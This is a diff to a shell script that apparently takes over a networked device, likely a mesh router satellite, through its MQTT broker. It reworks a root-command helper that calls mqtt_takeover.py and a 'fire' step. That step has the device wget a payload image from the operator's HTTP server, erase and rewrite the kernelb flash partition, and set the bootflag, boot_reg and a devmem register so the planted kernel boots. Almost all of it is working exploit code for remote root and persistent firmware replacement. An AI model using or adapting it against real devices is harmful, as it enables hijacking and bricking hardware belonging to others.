@@ -72,15 +72,23 @@ if [ -z "$SECRET" ]; then
 fi
 
     root_cmd() {
+    # The broker payload is a JSON envelope with the command inside it; build it here so any
+    # command survives as one string (no intermediate shell to split it) and pass it with --raw.
+    PAYLOAD=$("$PY" -c 'import json,sys; sys.stdout.buffer.write(json.dumps({"cmd": sys.argv[1], "reply": 1}).encode())' "$1") || {
+        echo "error: could not build the broker payload" >&2
+        return 1
+    }
+    # the C side needs the JSON envelope followed by one NUL byte, and sh cannot carry a NUL
+    # through a variable, so mqtt_takeover.py adds it for the --raw payload
     timeout "$(( ${2:-12} + 15 ))" "$PY" "$HERE/tools/mqtt_takeover.py" --host "$HOST" --port 1883 \
         --deviceid "$DEVICEID" --role satellite --secret "$SECRET" \
-        --cmd "id; $1" --listen "${2:-12}" 2>&1 |
+        --raw --cmd "$PAYLOAD" --listen "${2:-12}" 2>&1 |
         strings |
         sed -n 's/.*"data":"\(.*\)$/\1/p' | tail -1
 }
 
 if [ "$DRY_RUN" -eq 1 ]; then
-    root_cmd "${CMD:-uci show wireless}" 30
+    root_cmd "true" 30
     exit 0
 fi
 
@@ -190,16 +198,10 @@ fire)
     cp "$SLICE" "$HERE/build/linux-kbuild/tmp-payload-slice.bin"
     serve_and_push "$HERE"
     echo "[*] writing the image to kernelb via the broker channel"
-    FIRE_CMD="set -e; cd /tmp; \
-wget -O slice.bin http://$HTTP_IP:$HTTP_PORT/build/linux-kbuild/tmp-payload-slice.bin 2>/tmp/wget.log || { echo WGET_FAIL; tail -3 /tmp/wget.log; exit 1; }; \
-test \"\$(stat -c %s slice.bin)\" = \"$SLICE_SIZE\" || { echo SIZE_FAIL; exit 1; }; \
-test \"\$(md5sum slice.bin | cut -d' ' -f1)\" = \"$SLICE_MD5\" || { echo MD5_FAIL; exit 1; }; \
-mtd erase kernelb || { echo ERASE_FAIL; exit 1; }; \
-mtd write slice.bin kernelb || { echo WRITE_FAIL; exit 1; }; \
-mtd verify slice.bin kernelb || { echo VERIFY_FAIL; exit 1; }; \
-ln -sf /bin/fw_printenv /tmp/fw_setenv; \
-/tmp/fw_setenv bootflag b || { echo SETENV_FAIL; exit 1; }; \
-fw_printenv bootflag; sync; echo FIRE_OK"
+    # One line: a backslash continuation does not survive the device's JSON decode (attempt 2
+    # died on it). boot_reg is what hands control to the slice: with bootflag=b alone the
+    # vendor userspace boots stock from kernelb, which is what the 15:29 3df fire did.
+    FIRE_CMD="set -e; cd /tmp; rm -f slice.bin; wget -q -O slice.bin http://$HTTP_IP:$HTTP_PORT/build/linux-kbuild/tmp-payload-slice.bin 2>/tmp/wget.log || { echo WGET_FAIL; tail -3 /tmp/wget.log; exit 1; }; test \"\$(wc -c < slice.bin)\" = \"$SLICE_SIZE\" || { echo SIZE_FAIL; exit 1; }; test \"\$(md5sum slice.bin | cut -d' ' -f1)\" = \"$SLICE_MD5\" || { echo MD5_FAIL; exit 1; }; mtd erase kernelb || { echo ERASE_FAIL; exit 1; }; mtd write slice.bin kernelb || { echo WRITE_FAIL; exit 1; }; mtd verify slice.bin kernelb || { echo VERIFY_FAIL; exit 1; }; ln -sf /bin/fw_printenv /tmp/fw_setenv; /tmp/fw_setenv bootflag b || { echo SETENV_FAIL; exit 1; }; echo 0x21 > /sys/devices/platform/sysenv/boot_reg || { echo BOOTREG_FAIL; exit 1; }; devmem 0x10100C94 32 0xDEAD0000; fw_printenv bootflag; cat /sys/devices/platform/sysenv/boot_reg; sync; echo FIRE_OK"
     OUT=$(root_cmd "$FIRE_CMD" 240) || {
         stop_serve
         echo "error: the broker fire command failed" >&2
